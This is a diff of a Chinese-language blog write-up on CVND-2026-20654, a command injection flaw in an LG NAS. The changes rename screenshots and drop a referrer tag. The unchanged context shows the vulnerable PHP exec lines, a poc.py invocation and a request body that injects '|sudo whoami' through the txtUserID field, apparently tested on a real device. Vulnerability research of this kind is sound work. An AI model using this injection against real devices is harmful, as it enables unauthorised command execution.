@@ -16,7 +16,6 @@ slug: "cnvd-2026-20654-lg-nas-rce"
 
 import Gist from '../../components/Gist.astro';
 
-<meta name="referrer" content="no-referrer" />
 
 # CNVD-2026-20654: LG NAS 命令注入漏洞
 
@@ -38,7 +37,7 @@ import Gist from '../../components/Gist.astro';
 $userpasswd = trim(shell_exec("sudo nas-common md5$userpasswd"));
 ```
 
-![漏洞代码第28行](/blog/cnvd-lg-2026-20654/image.png)
+![漏洞代码第28行](/blog/cnvd-lg-2026-20654/01-vulnerable-code-line28.png)
 
 **第 78 行** (`share_set_user_info.php`):
 
@@ -46,7 +45,7 @@ $userpasswd = trim(shell_exec("sudo nas-common md5$userpasswd"));
 $check = trim(exec("sudo nas-share check_user$userID"));
 ```
 
-![漏洞代码第78行](/blog/cnvd-lg-2026-20654/image%201.png)
+![漏洞代码第78行](/blog/cnvd-lg-2026-20654/02-vulnerable-code-line78.png)
 
 ### 漏洞成因
 
@@ -69,7 +68,7 @@ $check = trim(exec("sudo nas-share check_user$userID"));
 
 [https://www.lg.com/us/support/product/lg-N2R1DD1](https://www.lg.com/us/support/product/lg-N2R1DD1)
 
-![固件下载页面](/blog/cnvd-lg-2026-20654/image%202.png)
+![固件下载页面](/blog/cnvd-lg-2026-20654/03-firmware-download-page.png)
 
 ### 本地环境搭建
 
@@ -102,15 +101,14 @@ python3 poc.py \
 
 具体搭建起来情况：
 
-![本地环境搭建](/blog/cnvd-lg-2026-20654/image%203.png)
+![本地环境搭建](/blog/cnvd-lg-2026-20654/04-local-environment-setup.png)
 
 使用 admin/admin 登录进来：
 
-![登录界面](/blog/cnvd-lg-2026-20654/image%204.png)
+![登录界面](/blog/cnvd-lg-2026-20654/05-nas-login-dashboard.png)
 
 执行 POC 的结果
-![登录界面](/blog/cnvd-lg-2026-20654/f053e44d-6d84-4f23-a33a-e6460b880a98.png)
-
+![登录界面](/blog/cnvd-lg-2026-20654/06-poc-execution-result.png)
 
 ## 真实设备挖掘
 
@@ -133,17 +131,17 @@ Connection: close
 txtMode=add&txtUserID=|sudo+whoami+>+../../zbx.txt
 ```
 
-![真实设备利用](/blog/cnvd-lg-2026-20654/image%205.png)
+![真实设备利用](/blog/cnvd-lg-2026-20654/07-real-device-exploit.png)
 
 ### 验证命令执行
 
 访问登录页面：
 
-![验证页面](/blog/cnvd-lg-2026-20654/d257b199-c63f-455f-8ae4-a221d92f4cbc.png)
+![验证页面](/blog/cnvd-lg-2026-20654/08-command-verification-page.png)
 
 查看命令执行结果：
 
-![命令执行结果](/blog/cnvd-lg-2026-20654/c02bbf5e-8541-4e8c-9172-f88287089971.png)
+![命令执行结果](/blog/cnvd-lg-2026-20654/09-rce-execution-output.png)
 
 成功写入并执行命令！
 
